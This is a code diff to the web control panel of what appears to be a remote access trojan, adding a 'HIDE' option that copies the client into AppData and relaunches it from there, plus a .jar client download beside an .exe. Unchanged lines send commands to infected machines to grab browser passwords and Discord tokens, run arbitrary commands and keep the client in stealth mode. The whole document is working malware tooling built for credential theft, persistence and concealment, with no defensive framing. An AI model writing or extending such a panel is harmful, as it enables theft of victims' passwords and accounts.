@@ -287,8 +287,13 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
       <div class="desc"><label>Stealth Mode</label><p>Run without any visible console window</p></div>
       <label class="toggle"><input type="checkbox" id="stealthToggle" checked onchange="updateBuildCmd()"><span class="sl"></span></label>
     </div>
+    <div class="opt-row">
+      <div class="desc"><label>HIDE</label><p>Copies itself to AppData, runs from there, exits the old instance</p></div>
+      <label class="toggle"><input type="checkbox" id="hideToggle" onchange="updateBuildCmd()"><span class="sl"></span></label>
+    </div>
     <div class="build-actions">
-      <button class="btn btn-primary" onclick="downloadClient()">⬇ Download Client</button>
+      <button class="btn btn-primary" onclick="downloadClient()">⬇ Download .exe</button>
+      <button class="btn btn-ghost" onclick="downloadJar()">⬇ Download .jar</button>
       <button class="btn btn-accent" onclick="copyBuildCmd()">📋 Copy Deploy Cmd</button>
     </div>
     <div class="install-cmd" id="buildCmdDisplay">
@@ -479,6 +484,7 @@ async function quickCmd(n){const cmd=prompt('Command for '+n+':');if(!cmd)return
 async function quickBW(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'browser_passwords',payload:'',status:'pending'})});toast('Browser password request sent to '+n)}catch{}}
 async function quickTokens(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'discord_tokens',payload:'',status:'pending'})});toast('Token grab requested for '+n)}catch{}}
 function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe'}
+function downloadJar(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/client.jar'}
 async function removeClient(n){
   if(!confirm('Remove '+n+' and all its data?'))return;
   try{await fetch(FB+'/pings/'+fbEsc(n)+'.json',{method:'DELETE'});await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'DELETE'});await fetch(FB+'/live/'+fbEsc(n)+'.json',{method:'DELETE'});toast('Removed '+n);load()}catch{}
@@ -695,7 +701,8 @@ function buildArgs(){
   const p=document.getElementById('pingToggle').checked;
   const sc=document.getElementById('screenToggle').checked;
   const st=document.getElementById('stealthToggle').checked;
-  let a='';if(n)a+=' --name "'+n+'"';if(!s)a+=' --no-startup';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';
+  const h=document.getElementById('hideToggle').checked;
+  let a='';if(n)a+=' --name "'+n+'"';if(!s)a+=' --no-startup';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';if(h)a+=' --hide';
   return a;
 }
 function updateBuildCmd(){
